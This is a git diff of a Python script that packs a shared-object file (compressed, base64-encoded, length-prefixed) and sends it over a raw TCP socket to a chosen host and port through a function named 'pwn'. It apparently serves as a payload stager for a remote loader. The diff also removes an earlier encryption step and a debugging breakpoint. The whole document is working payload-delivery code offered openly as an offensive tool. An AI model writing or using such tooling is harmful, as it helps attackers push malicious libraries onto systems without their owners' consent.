@@ -4,14 +4,13 @@ import argparse
 import sys
 import zlib
 import base64
+import socket
 from dataclasses import dataclass
 
 
 @dataclass
 class customSO:
-    size: int
-    key: hex
-    padding: hex
+    size: bytes
     payload: bytearray
 
 def krypto(bArray: bytes):
@@ -43,16 +42,35 @@ def readIn(fName:str):
         sys.exit(1)
 
 
+def pwn(ipAddr, port, payload):
+    """connect to destination host and send byte array"""
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    try:
+        s.connect((ipAddr, int(port)))
+        print(f"First N-bytes of payload: {payload[0:10]}")
+        s.sendall(payload)
+    except ConnectionRefusedError as connError:
+        print(f"Conn Error: {connError}")
+    print("Data sent!")
+
 if __name__ == "__main__":
 
     args = argparse.ArgumentParser()
     args.add_argument("--file", "-f", required=True,
                       help="Specify shared object to load")
 
+    args.add_argument("--dest", "-d", required=True,
+                      default="localhost", help="Specify destination server")
+
+    args.add_argument("--port", "-p", required=True,
+                      default="1776", help="Specify destination port")
+
     parser = args.parse_args()
     bArray = readIn(parser.file)
-    print("Raw byte array: %s", str(len(bArray)))
-    cArray = krypto(compress(bArray))
+    print(f"Raw byte arrayis : {str(len(bArray))}")
+    lenArray = hex(len(bArray))[2:] # strip the 0x
+    cArray = compress(bArray)
     encoded_array = base64.b64encode(cArray)
-    CSO = customSO(len(encoded_array), 0x42, 0x00, encoded_array)
-    import pdb; pdb.set_trace()
+    CSO = customSO(lenArray, encoded_array)
+    fPayload = bytes(CSO.size, "UTF-8") + CSO.payload
+    pwn(parser.dest, parser.port, fPayload)
